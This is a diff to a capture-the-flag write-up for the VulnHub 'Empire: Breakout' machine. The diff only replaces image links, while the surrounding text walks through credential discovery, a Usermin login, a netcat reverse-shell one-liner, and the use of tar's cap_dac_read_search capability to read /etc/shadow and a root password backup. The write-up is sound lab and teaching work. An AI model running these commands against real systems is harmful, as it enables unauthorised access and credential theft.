@@ -51,7 +51,8 @@ Nmap done: 1 IP address (1 host up) scanned in 46.84 seconds
 
 ## Port 80
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/15fa14b6-bd33-4c80-ae2e-d0577e3b7715/image.png)
+![image1](https://github.com/user-attachments/assets/bd17d2ef-e799-4ea5-a5de-bad5e810d366)
+
 
 We are greeted with the apache2 default page. Nothing too special on the page. Let’s look at the source code to see if we find anything.
 
@@ -76,7 +77,8 @@ It seems this could be a password to an account. Let’s visit the other ports w
 
 ## Port 10000
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/dcc8a846-f488-4f3f-beed-f7879cc66cf7/image.png)
+![2](https://github.com/user-attachments/assets/033a6325-8e57-4b01-abd9-3563a2ccbd6f)
+
 
 We are greeted with a login page. We can try to login with the password we obtained earlier. Using admin as the user with the password doesn’t work. This means that we need to look for a valid username.
 
@@ -109,15 +111,18 @@ enum4linux complete on Thu Jan  9 03:10:49 2025
 
 We can see that there is a local user with the username cyber. Let’s try using that as our username on the Webmin login page.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/3d4f6737-6564-4e34-8f7d-423c15ff0547/image.png)
+![3](https://github.com/user-attachments/assets/8275438b-88ba-4f0b-80f9-0b35da20197d)
+
 
 Well, that didn’t work. There is another service Usernmin running on port 20000. We can check to see if the credentials work there.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/9ddef0c8-0342-4f37-8bdf-216b9b4a1e12/image.png)
+![4](https://github.com/user-attachments/assets/95f7ce8d-5992-4189-9365-8eb3cf20fe7d)
+
 
 And there we go, we are now logged in onto Usermin. We can now use the inbuilt terminal to run commands on the server.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/9b590a03-9533-48c3-b6af-4aa98db0721a/image.png)
+![5](https://github.com/user-attachments/assets/2fac5282-770c-41d3-9c56-b40366344a92)
+
 
 Let us get a more interactive shell by using netcat.
 
@@ -125,7 +130,8 @@ Let us get a more interactive shell by using netcat.
 [cyber@breakout ~]$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.56.103 4242 >/tmp/f
 ```
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/445c75bc-a961-4ad2-8657-0931947eba2b/image.png)
+![6](https://github.com/user-attachments/assets/5c5c8360-deb2-49c3-bc68-6a87da642b3b)
+
 
 After getting a more interactive shell using python, we get the user.txt file.
 
@@ -135,19 +141,22 @@ Now time to escalate the privileges.
 
 We can see that there is a binary for the tar program there. Which is likely our way to root.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/93f8a00c-5ea0-4f3e-93a1-c6a130cac7cd/image.png)
+![7](https://github.com/user-attachments/assets/4e44aa5b-bc81-44ce-a927-d46c094eb2d1)
+
 
 My first thought was that maybe we have sudo as root on the tar binary. But sudo was disabled so we can’t do that.
 
 We can use getcap to see what capabilities the binary has.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/65f29b93-5210-4aa0-aea6-4144e2773e5f/image.png)
+![9](https://github.com/user-attachments/assets/bc0bd0f1-c59b-435a-ab26-c15683ef1bfc)
+
 
 The cap_dac_read_search capability allows us to bypass file read permissions.
 
 We can try and see if we can read the /etc/shadow file.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/48dde4a3-e4b9-48f5-b8cb-5da9ff539af8/image.png)
+![10](https://github.com/user-attachments/assets/fcd09e0a-03dd-4426-b0d3-97473c9f9a39)
+
 
 And sure enough we can.
 
@@ -155,22 +164,25 @@ We can try and crack the hashes offline, but considering the password for cyber 
 
 Since we can read any file as root, we can look for interesting files owned by root in any of the usual places such as /var/backup or /opt.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/2ccc6616-798e-4656-867c-e43669c1745d/image.png)
+![11](https://github.com/user-attachments/assets/fc7ac7d8-21e2-4950-8e56-79c736f14f7e)
+
 
 Looking at /var/backup we can see a .old_pass.bak file which is readable only by root.
 
 Let’s use out tar binary to read this file.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/78c1ced4-3e8d-49bc-8da0-6bc71b8acd92/image.png)
+![12](https://github.com/user-attachments/assets/7775db6b-c588-418b-825a-0807ce461d86)
+
 
 We seem to get a complex looking password.
 
 Let’s try to su to root using this pass.
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/2381d0bc-04d1-4cf1-97ec-a2710231d95b/image.png)
+![13](https://github.com/user-attachments/assets/46e2d85e-986e-4b22-b607-195993c8424f)
+
 
 And there we go, we finally have root
 
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/fc3a63cb-9633-4515-9432-fe1dc9c08dfe/fd904eab-e1a0-41ff-8a10-455123c79302/image.png)
+![14](https://github.com/user-attachments/assets/b4681ba9-e7c7-481b-b147-3fb6bb338079)
 
 https://www.vulnhub.com/entry/empire-breakout,751/
